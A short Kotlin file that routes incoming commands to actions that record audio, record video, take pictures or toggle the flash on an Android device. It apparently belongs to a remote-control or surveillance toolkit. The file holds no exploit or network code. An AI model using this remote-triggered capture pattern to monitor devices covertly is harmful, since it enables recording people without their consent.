package com.hawkshaw.library.features.media

import android.util.Log // Added for logging
import com.hawkshaw.library.datalayer.models.Command
import kotlinx.serialization.Serializable

private const val TAG = "MediaCommand" // Added for logging

/**
 * Represents different types of media commands that can be executed
 */
@Serializable
sealed class MediaCommand {
    @Serializable
    data class RecordAudio(val request: Command.RecordAudioRequest) : MediaCommand()
    
    @Serializable
    data class RecordVideo(val request: Command.RecordVideoRequest) : MediaCommand()
    
    @Serializable
    data class TakePicture(val request: Command.TakePictureRequest) : MediaCommand()
    
    @Serializable
    data class Flash(val request: Command.FlashRequest) : MediaCommand()
    
    companion object {
        fun fromCommand(command: Command): MediaCommand? {
            Log.d(TAG, "[DEBUG] fromCommand called with Command: $command") // Logging the input command
            return when {
                command.recordAudioRequest != null -> {
                    Log.d(TAG, "[DEBUG] Creating RecordAudio from command.recordAudioRequest: ${command.recordAudioRequest}")
                    RecordAudio(command.recordAudioRequest)
                }
                command.recordVideoRequest != null -> {
                    Log.d(TAG, "[DEBUG] Creating RecordVideo from command.recordVideoRequest: ${command.recordVideoRequest}")
                    RecordVideo(command.recordVideoRequest)
                }
                command.takePictureRequest != null -> {
                    Log.d(TAG, "[DEBUG] Creating TakePicture from command.takePictureRequest: ${command.takePictureRequest}")
                    TakePicture(command.takePictureRequest)
                }
                command.flashRequest != null -> {
                    Log.d(TAG, "[DEBUG] Creating Flash from command.flashRequest: ${command.flashRequest}")
                    Flash(command.flashRequest)
                }
                else -> {
                    Log.d(TAG, "[DEBUG] No matching media command type found for Command. Returning null.")
                    null
                }
            }
        }
    }
}